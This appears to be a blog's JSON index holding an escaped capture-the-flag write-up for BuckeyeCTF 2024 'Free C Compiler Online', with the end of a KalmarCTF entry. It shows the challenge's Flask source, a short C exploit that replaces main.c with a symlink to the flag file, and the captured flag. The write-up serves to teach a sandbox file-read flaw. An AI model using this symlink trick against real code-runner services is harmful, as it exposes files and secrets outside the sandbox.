style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e subprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Flask(__name__)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003estorage_path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(__file__)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparent \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;storage\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eos\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esystem(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;podman pull docker.io/library/gcc:latest\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.get\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eget_index\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;index.html\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.get\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026lt;id\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eget_result\u003c/span\u003e(id):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e str(UUID(id))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(storage_path, id, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;main.c\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread_text()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e output \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(storage_path, id, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;output.txt\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread_text()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFileNotFoundError\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e NotFound()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e output \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e output \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[no output yet, try refreshing]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;result.html\u0026#34;\u003c/span\u003e, code\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecode, output\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eoutput)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.post\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/run\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epost_run\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejson \u003cspan style=\"color:#f92672\"\u003eis\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e UnsupportedMediaType()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejson[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;code\u0026#34;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e isinstance(code, str):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e BadRequest()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e run_code(code)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e jsonify({\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e: id})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erun_code\u003c/span\u003e(code):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(code) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10000\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e Forbidden()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e uuid4()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e folder \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(storage_path, str(id))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e folder\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emkdir(parents\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Path(folder, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;main.c\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite_text(code)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esystem(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;podman run --timeout 5 --detach -v \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003estr(folder\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eabsolute())\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e:/mnt --workdir /mnt gcc \u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sh -c \u0026#39;gcc main.c \u0026gt; output.txt 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; ./a.out | head -c 1000 \u0026gt;\u0026gt; output.txt\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e )\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ePopen(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sleep 60; rm -r \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003efolder\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eabsolute()\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, shell\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e id\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;started\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAs we can see, there are 2 main endpoints: \u003ccode\u003e@app.post(\u0026quot;/run\u0026quot;)\u003c/code\u003e amd \u003ccode\u003e@app.get(\u0026quot;/\u0026lt;id\u0026gt;\u0026quot;)\u003c/code\u003e. The first one is used to compile our source code and run it, all in a podman pod and the second one is used to display the source code that was compiled and executed alongside the output.\u003c/p\u003e","title":"KalmarCTF 2025 RWX Gold"},{"content":"Intro This post covers Free C Compiler Online from BuckeyeCTF 2024. The description of the challenge is as follows:\nIt is free of charge, but is it free of bugs?\nNo, it\u0026rsquo;s not.\nAnalyzing The Source Code The following is the source code of the application:\nfrom flask import ( Flask, json, jsonify, request, render_template, ) from pathlib import Path from uuid import uuid4, UUID import os from werkzeug.exceptions import NotFound, BadRequest, Forbidden import subprocess app = Flask(__name__) storage_path = Path(__file__).parent / \u0026#34;storage\u0026#34; os.system(\u0026#34;podman pull docker.io/library/gcc:latest\u0026#34;) @app.get(\u0026#34;/\u0026#34;) def get_index(): return render_template(\u0026#34;index.html\u0026#34;) @app.get(\u0026#34;/\u0026lt;id\u0026gt;\u0026#34;) def get_result(id): id = str(UUID(id)) try: code = Path(storage_path, id, \u0026#34;main.c\u0026#34;).read_text() output = Path(storage_path, id, \u0026#34;output.txt\u0026#34;).read_text() except FileNotFoundError: raise NotFound() if output == \u0026#34;\u0026#34;: output = \u0026#34;[no output yet, try refreshing]\u0026#34; return render_template(\u0026#34;result.html\u0026#34;, code=code, output=output) @app.post(\u0026#34;/run\u0026#34;) def post_run(): if request.json is None: raise UnsupportedMediaType() code = request.json[\u0026#34;code\u0026#34;] if not isinstance(code, str): raise BadRequest() id = run_code(code) return jsonify({\u0026#34;id\u0026#34;: id}) def run_code(code): if len(code) \u0026gt; 10000: raise Forbidden() id = uuid4() folder = Path(storage_path, str(id)) folder.mkdir(parents=True) Path(folder, \u0026#34;main.c\u0026#34;).write_text(code) os.system( f\u0026#34;podman run --timeout 5 --detach -v {str(folder.absolute())}:/mnt --workdir /mnt gcc \u0026#34; + \u0026#34;sh -c \u0026#39;gcc main.c \u0026gt; output.txt 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; ./a.out | head -c 1000 \u0026gt;\u0026gt; output.txt\u0026#39;\u0026#34; ) subprocess.Popen(f\u0026#34;sleep 60; rm -r {folder.absolute()}\u0026#34;, shell=True) return id print(\u0026#34;started\u0026#34;) As we can see, there are 2 main endpoints: @app.post(\u0026quot;/run\u0026quot;) amd @app.get(\u0026quot;/\u0026lt;id\u0026gt;\u0026quot;). The first one is used to compile our source code and run it, all in a podman pod and the second one is used to display the source code that was compiled and executed alongside the output.\nReplacing The Source Code With a Symlink The flag is located at /app/flag.txt, while the compilation files are temporarily saved to /app/storage/\u0026lt;UUID\u0026gt; . Both compilation and execution take place inside a pod, which doesn\u0026rsquo;t have direct access to the flag file. However, we notice that:\nInside a pod, we have access to the source code main.c of the program that\u0026rsquo;s being executed, The web application has access to the flag file, The web application displays the source code main.c of the program was run via the @app.get(\u0026quot;/\u0026lt;id\u0026gt;\u0026quot;) endpoint. We create a program that removes main.c and replaces it with a symlink to /app/flag.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { system(\u0026#34;rm main.c \u0026amp;\u0026amp; ln -s /app/flag.txt main.c\u0026#34;); return 0; } Now we run it, and display the results. Since we replaced main.c with a symlink to the flag, the web application displays the flag content under the Code section.\nWe got the flag! bctf{fr33d0m_1s_bu7_4n_3mp7y_1llu510n_b842fff60fc03a4f}\n","permalink":"http://localhost:1313/posts/buckeyectf-2024-free-c-compiler-online/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis post covers \u003cem\u003eFree C Compiler Online\u003c/em\u003e from \u003cem\u003eBuckeyeCTF 2024\u003c/em\u003e. The description of the challenge is as follows:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eIt is free of charge, but is it free of bugs?\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNo, it\u0026rsquo;s not.\u003c/p\u003e\n\u003ch2 id=\"analyzing-the-source-code\"\u003eAnalyzing The Source Code\u003c/h2\u003e\n\u003cp\u003eThe following is the source code of the application:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e flask \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e Flask,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e json,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e jsonify,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e request,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e render_template,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e pathlib \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e Path\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e uuid \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e uuid4, UUID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e os\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e werkzeug.exceptions \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e NotFound, BadRequest, Forbidden\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e subprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Flask(__name__)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003estorage_path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(__file__)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparent \u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;storage\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eos\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esystem(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;podman pull docker.io/library/gcc:latest\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.get\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eget_index\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;index.html\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.get\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026lt;id\u0026gt;\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eget_result\u003c/span\u003e(id):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e str(UUID(id))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(storage_path, id, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;main.c\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread_text()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e output \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(storage_path, id, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;output.txt\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread_text()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFileNotFoundError\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e NotFound()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e output \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e output \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[no output yet, try refreshing]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;result.html\u0026#34;\u003c/span\u003e, code\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecode, output\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eoutput)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e@app.post\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/run\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epost_run\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejson \u003cspan style=\"color:#f92672\"\u003eis\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e UnsupportedMediaType()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e code \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejson[\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;code\u0026#34;\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e isinstance(code, str):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e BadRequest()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e run_code(code)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e jsonify({\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e: id})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erun_code\u003c/span\u003e(code):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(code) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10000\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eraise\u003c/span\u003e Forbidden()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    id \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e uuid4()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e folder \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Path(storage_path, str(id))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e folder\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emkdir(parents\u003cspan 